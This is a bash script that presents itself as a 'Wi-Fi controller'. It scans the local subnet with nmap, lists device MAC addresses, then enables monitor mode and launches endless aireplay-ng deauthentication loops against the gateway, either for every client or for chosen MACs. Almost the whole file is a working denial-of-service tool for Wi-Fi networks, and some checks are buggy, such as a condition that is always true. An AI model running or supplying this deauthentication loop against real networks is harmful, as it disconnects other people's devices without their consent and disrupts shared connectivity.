#!/bin/bash
#
columns 100
rows 35
integer_re='^[0-9]+$'
double_re='^[0-9]+([.][0-9]+)?$'
ipcounter=-1
maccounter=-1
descriptioncounter=-1
workdirectory=$(pwd)
ip_array=()
mac_array=()
getgateway=$(netstat -rn|grep 'UG[ \t]'|awk '{print $2}')
if [[ -f 'NMAPREPORT.network' ]]; then
	rm NMAPREPORT.network
fi
if [[ -f 'SETEABLEINTERFACES-MAC.network' ]]; then
	rm SETEABLEINTERFACES-MAC.network
fi
if [[ -f 'SETEABLEINTERFACES-IP.network' ]]; then
	rm SETEABLEINTERFACES-IP.network
fi
prev_macgateway=$(iwconfig|awk '/Access Point:/ {print $6}'|cut -d / -f1)
clear
echo $prev_macgateway
echo '----------------------------------------------------------------------------------------------------'
echo 'WELCOME TO WIFI CONTROLER'
echo '----------------------------------------------------------------------------------------------------'
echo 'Interface list: (use only interfaces with wireless extensions)'
echo '----------------------------------------------------------------------------------------------------'
iwconfig|awk '/wlan/ {print $1}'|cut -d / -f1
echo '----------------------------------------------------------------------------------------------------'
echo "Select the interface..."
echo '----------------------------------------------------------------------------------------------------'
read -p '-> ' interface
echo '----------------------------------------------------------------------------------------------------'
echo "The interface is: $interface"
echo '----------------------------------------------------------------------------------------------------'
#lo interface
if [[ $interface == 'lo' ]]; then
	localip=$(ip -o -4 addr list $interface |awk '{print $4}' |cut -d / -f1)
	localmac=$(ip link show $interface |awk '/loopback/ {print $2}')
	echo "Current IP: $localip - Current MAC Address: $localmac"
	runningARP=1
#eth interface
elif [[ $interface == eth* ]]; then
	localip=$(ip -o -4 addr list $interface |awk '{print $4}' |cut -d / -f1)
	localmac=$(ip link show $interface |awk '/ether/ {print $2}')
	echo "Current IP: $localip - Current MAC Address: $localmac"
	runningARP=1
#wlan interface
elif [[ $interface == wlan* ]]; then
	localip=$(ip -o -4 addr list $interface |awk '{print $4}' |cut -d / -f1)
	localmac=$(ip link show $interface |awk '/ether/ {print $2}')
	echo "Current IP: $localip - Current MAC Address: $localmac"
	runningARP=1
else
	echo "The interface '$interface' is not supported, sorry!"
	runningARP=0
	exit
fi
if [[ runningARP=1 ]]; then
	echo 'Runing ARP Ping Scan, please wait...(This proccess take several minutes)'
	nmap -sP $getgateway/24>>NMAPREPORT.network
	echo 'ARP Scan ending...'
	while IFS= read -r line
	do
		setip=$(echo $line |awk '/Nmap scan report for/ {print $5}')
		setmac=$(echo $line |awk '/MAC Address:/ {print $3}')
		setdescription=$(echo $line |awk '/MAC Address:/')
		if [[ $setdescription != '' ]]; then
			let descriptioncounter=$descriptioncounter+1
			if [[ $descriptioncounter != 0 ]]; then
				echo "($descriptioncounter) $setdescription"
				#>>SETEABLEINTERFACES-DESC.network
			fi
		fi
		if [[ $setmac != '' ]]; then
			let maccounter=$maccounter+1
			if [[ $maccounter == 0 ]]; then
				macgateway=$setmac
			fi
			mac_array+=("$maccounter $setmac")
			echo "($maccounter) $setmac">>SETEABLEINTERFACES-MAC.network
		fi
		if [[ $setip != '' && $setip != $localip ]]; then
			let ipcounter=$ipcounter+1
			if [[ $ipcounter == 0 ]]; then
				ipgateway=$setip
			fi
			ip_array+=("$ipcounter $setip")
			echo "($ipcounter) $setip">>SETEABLEINTERFACES-IP.network
		fi
	done < <(cat NMAPREPORT.network)
					for v in "${mac_array[@]}"
					do
						echo $v
					done
	echo "Total devices: $descriptioncounter"
	echo '----------------------------------------------------------------------------------------------------'
	echo "Type the devices without permissions to connect..."
	echo "(Can be separate by ',' on multiple devices or 'all' if u want disconnet all devices from network)"
	echo '----------------------------------------------------------------------------------------------------'
	read -p '-> ' multiinterfaces
	macgateway=$prev_macgateway
	echo '----------------------------------------------------------------------------------------------------'
	echo "Please type de MAC from gateway...(Default: $macgateway)"
	echo '----------------------------------------------------------------------------------------------------'
	read -p '-> ' nmacgateway
	if [[ $nmacgateway != '' ]]; then
		macgateway=$nmacgateway
	fi
	multiinterfaces=${multiinterfaces//' '/''}
	if [[ $multiinterfaces == 'all' ]]; then
		airmon-ng start $interface
		#airodump-ng wlan0mon --bssid 00:00:00:00:00:00
		xterm -e "airodump-ng $interface""mon --bssid $macgateway" &
		xterm -e "while true; do aireplay-ng $interface""mon --deauth 5000 -a $macgateway; done" &
		clear
		echo "System is running!"
	else
		if ! [[ ${multiinterfaces//','/''} =~ $integer_re ]] ; then
			echo "error: Not a number" >&2
		else
			airmon-ng start $interface
			xterm -e "airodump-ng $interface""mon --bssid $macgateway" &
			clear
			IFS=',' read -r -a networks <<< "$multiinterfaces"
			for h in "${networks[@]}"
			do
				if [[ $descriptioncounter -lt $h ]]; then
					echo "($h) <<- isn't in the interface list!"
				else
					for z in "${mac_array[@]}"
					do
						set_mac_array=$(echo $z|awk '{print $1}')
						if [[ $h == $set_mac_array ]]; then
							client_deauth_in=$(echo $z|awk '{print $2}')
						fi
					done
					echo "Disconecting interface: ->>($h) ->> $client_deauth_in"
					xterm -e "while true; do aireplay-ng $interface""mon --deauth 5000 -a $macgateway -c $client_deauth_in; done" &
					echo "System is running!"
					echo '----------------------------------------------------------------------------------------------------'

				fi
			done
		fi
	fi
	#aireplay-ng wlan0mon --deauth 50 -a 00:00:00:00:00:00 -c 11:11:11:11:11:11
	#firstlenght=${#multiinterfaces}
	#uniquevalues=${multiinterfaces//','/''}
	#secondlenght=${#uniquevalues}
	#let summarylenght=firstlenght-secondlenght
	#let summarylenght=$summarylenght+1
	#echo "Total disconnect devices: $summarylenght"
	#currentMAC=$multiinterfaces
	#startcounterdisconnect=0
	#leftMAC=''
	#while [[ $startcounterdisconnect -lt $summarylenght ]]
	#do
	#	indexMAC=0
	#	currentMAC=${currentMAC//$leftMAC/''}
	#	echo $startcounterdisconnect
	#	let startcounterdisconnect=$startcounterdisconnect+1
	#done

fi
#clear dependences
if [[ -f 'NMAPREPORT.network' ]]; then
	rm NMAPREPORT.network
fi
if [[ -f 'SETEABLEINTERFACES-MAC.network' ]]; then
	rm SETEABLEINTERFACES-MAC.network
fi
if [[ -f 'SETEABLEINTERFACES-IP.network' ]]; then
	rm SETEABLEINTERFACES-IP.network
fi
